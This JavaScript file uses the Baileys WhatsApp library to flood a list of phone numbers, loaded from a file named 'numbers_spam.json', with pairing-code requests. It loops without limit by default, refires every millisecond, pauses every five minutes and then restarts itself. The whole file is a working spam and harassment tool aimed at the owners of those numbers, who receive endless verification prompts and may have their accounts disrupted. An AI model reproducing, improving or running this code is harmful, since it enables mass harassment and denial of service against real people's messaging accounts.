const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const fs = require('fs').promises;
const path = require('path');
const { fork } = require('child_process');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

const question = (text) => new Promise((resolve) => rl.question(text, resolve));

async function fetchPhoneNumbers() {
    try {
        const data = await fs.readFile('numbers_spam.json', 'utf8');
        const jsonData = JSON.parse(data);
        return Object.values(jsonData).flat();
    } catch (error) {
        return [];
    }
}

async function processRequests(XeonBotInc, phoneNumbers, xeonCodes) {
    let requestCount = 0;
    while (xeonCodes === Infinity || requestCount < xeonCodes) {
        await Promise.all(phoneNumbers.map(async (number) => {
            if (xeonCodes !== Infinity && requestCount >= xeonCodes) return;
            try {
                await XeonBotInc.requestPairingCode(number);
                requestCount++;
            } catch (error) {
            }
        }));
    }
}

async function XeonProject() {
    const { state } = await useMultiFileAuthState('./session');
    const XeonBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    try {
        let phoneNumbers = await fetchPhoneNumbers();
        let xeonCodes;

        const choicePromise = question('Choose (1 for 100, 2 for 1000, 3 for unlimited): ');
        const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve('3'), 1000));
        const choice = await Promise.race([choicePromise, timeoutPromise]);

        switch (choice) {
            case '1':
                xeonCodes = 100;
                break;
            case '2':
                xeonCodes = 1000;
                break;
            case '3':
            case '':
                xeonCodes = Infinity;
                break;
            default:
                xeonCodes = Infinity;
                break;
        }

        const requestInterval = setInterval(async () => {
            phoneNumbers = await fetchPhoneNumbers(); // تحديث الأرقام هنا
            await processRequests(XeonBotInc, phoneNumbers, xeonCodes);
        }, 1);

        const updateInterval = setInterval(async () => {
            phoneNumbers = await fetchPhoneNumbers(); // تحديث الأرقام كل 5 ثواني
        }, 5000);

        // استراحة كل 5 دقائق
        setInterval(() => {
            console.log('Taking a short break for 5 minutes...');
            clearInterval(requestInterval);
            clearInterval(updateInterval);
            setTimeout(async () => {
                console.log('Resuming requests...');
                phoneNumbers = await fetchPhoneNumbers(); // تحديث الأرقام عند الاستئناف
                await processRequests(XeonBotInc, phoneNumbers, xeonCodes);
                XeonProject(); // إعادة تشغيل البرنامج
            }, 300000); // استراحة لمدة 5 دقائق
        }, 300000); // كل 5 دقائق

    } catch (error) {
    } finally {
        rl.close();
    }

    return XeonBotInc;
}

XeonProject();
